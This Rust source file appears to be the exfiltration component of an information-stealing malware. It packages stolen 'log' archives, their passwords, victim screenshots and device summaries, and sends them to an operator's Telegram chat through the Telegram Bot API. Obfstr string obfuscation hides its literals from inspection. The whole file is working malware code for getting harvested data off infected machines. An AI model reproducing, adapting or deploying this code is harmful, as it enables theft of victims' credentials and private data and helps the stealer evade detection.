use crate::{LogFile, LogSender, SendError};
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use alloc::{format, vec};
use collector::{Collector, Device, DisplayCollector};
use core::fmt::{Display, Error, Formatter};
use derive_new::new;
use obfstr::obfstr as s;
use requests::{write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
use utils::format_size;

#[derive(new, Clone)]
pub struct TelegramBot {
    chat_id: Arc<str>,
    token: Arc<str>
}

fn generate_caption<P, C>(log: &LogFile, password: Option<P>, collector: &C) -> (String, Option<String>)
where
    P: AsRef<str>,
    C: Collector
{
    let caption = DisplayCollector(collector).to_string();

    let link = match log {
        LogFile::ExternalLink((link, size)) => Some(
            format!(
                r#"<a href="{}">Download [{}]</a>"#,
                link,
                format_size(*size as _)
            )
        ),
        LogFile::ZipArchive(_) => None
    };

    let password = password.map(|password| {
        let password = password.as_ref();
        format!(r#"Password: <code>{password}</code>"#)
    });

    let mut parts = vec![];
    if let Some(l) = link { parts.push(l); }
    if let Some(p) = password { parts.push(p); }
    let thumbnail = if parts.is_empty() { None } else { Some(parts.join(" ")) };

    (caption, thumbnail)
}

#[derive(Default)]
pub struct MediaGroup {
    items: Vec<MediaItem>,
}

pub struct MediaItem {
    media_type: String,
    media: String,
    caption: Option<String>,
    parse_mode: Option<String>,
}

impl MediaGroup {
    pub fn add_document(&mut self, media_name: impl Into<String>, caption: Option<String>) -> &mut Self {
        self.items.push(MediaItem {
            media_type: s!("document").to_string(),
            media: format!("attach://{}", media_name.into()),
            caption,
            parse_mode: Some(s!("HTML").to_string()),
        });
        self
    }

    pub fn add_photo(&mut self, media_name: impl Into<String>, caption: Option<String>) -> &mut Self {
        self.items.push(MediaItem {
            media_type: s!("photo").to_string(),
            media: format!("attach://{}", media_name.into()),
            caption,
            parse_mode: Some(s!("HTML").to_string()),
        });
        self
    }
}

impl Display for MediaItem {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(f, r#"{{"type": "{}","media": "{}""#, self.media_type, self.media)?;

        if let Some(caption) = &self.caption {
            let escaped = caption.replace('\\', "\\\\").replace('"', "\\\"");
            write!(f, r#","caption": "{escaped}""#)?;
        }

        if let Some(parse_mode) = &self.parse_mode {
            write!(f, r#","parse_mode": "{parse_mode}""#)?;
        }

        write!(f, "}}")
    }
}

impl Display for MediaGroup {
    fn fmt(&self, f: &mut Formatter<'_>) -> Result<(), Error> {
        let json = self.items
            .iter()
            .map(ToString::to_string)
            .collect::<Vec<_>>()
            .join(",");

        write!(f, "[{json}]")
    }
}

impl TelegramBot {
    fn send_as_file(&self, archive: Vec<u8>, screenshot: Option<Vec<u8>>, caption: String, thumbnail: Option<String>) -> Result<(), SendError> {
        let mut builder = MultipartBuilder::new("----BoundaryMediaGroup");

        write_text_field!(builder, "chat_id" => &self.chat_id);

        let mut media_group = MediaGroup::default();

        if let Some(screenshot_bytes) = &screenshot {
            media_group.add_document("screenshot", Some(caption));
            media_group.add_document("logfile", thumbnail);

            write_file_field!(builder, "screenshot", "screenshot.png", "image/png", screenshot_bytes);
        } else {
            let combined_caption = combine_caption_and_thumbnail(&caption, thumbnail);
            media_group.add_document("logfile", Some(combined_caption));
        }

        let media_json = media_group.to_string();

        write_text_field!(builder, "media" => &media_json);
        write_file_field!(builder, "logfile", "log.zip", "application/zip", &archive);

        self.send_request(s!("sendMediaGroup"), builder)?;

        Ok(())
    }

    fn send_as_link(&self, screenshot: Option<Vec<u8>>, caption: String, thumbnail: Option<String>) -> Result<(), SendError> {
        let combined_caption = combine_caption_and_thumbnail(&caption, thumbnail);

        match screenshot {
            Some(photo_bytes) => {
                let mut builder = MultipartBuilder::new("----BoundaryPhoto");
                write_text_field!(builder, "chat_id" => &self.chat_id);
                write_text_field!(builder, "caption" => &combined_caption);
                write_text_field!(builder, "parse_mode", "HTML");
                write_file_field!(builder, "photo", "screenshot.png", "image/png", &photo_bytes);

                self.send_request(s!("sendPhoto"), builder)?
            }
            None => {
                let mut builder = MultipartBuilder::new("----BoundaryPhoto");
                write_text_field!(builder, "chat_id" => &self.chat_id);
                write_text_field!(builder, "text" => &combined_caption);
                write_text_field!(builder, "parse_mode", "HTML");

                self.send_request(s!("sendMessage"), builder)?
            }
        }

        Ok(())
    }

    fn send_request(&self, method: &str, body: MultipartBuilder) -> Result<(), SendError> {
        let content_type = body.content_type();
        let body = body.finish();

        Request::post(format!("https://api.telegram.org/bot{}/{}", self.token, method))
            .header(s!("Content-Type"), &content_type)
            .body(body)
            .build()
            .send()
            .ok().ok_or(SendError::Network)?;

        Ok(())
    }
}

fn combine_caption_and_thumbnail(caption: &str, thumbnail: Option<String>) -> String {
    match thumbnail {
        Some(tn) if !tn.is_empty() => format!("{caption}\n{tn}"),
        _ => caption.to_string(),
    }
}

impl LogSender for TelegramBot {
    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
    where
        P: AsRef<str> + Clone,
        C: Collector
    {
        let (caption, thumbnail) = generate_caption(&log_file, password, collector);

        match log_file {
            LogFile::ZipArchive(archive) => self.send_as_file(
                archive,
                collector.get_device().get_screenshot(),
                caption,
                thumbnail
            ),
            LogFile::ExternalLink(_) => self.send_as_link(
                collector.get_device().get_screenshot(),
                caption,
                thumbnail
            )
        }
    }
}
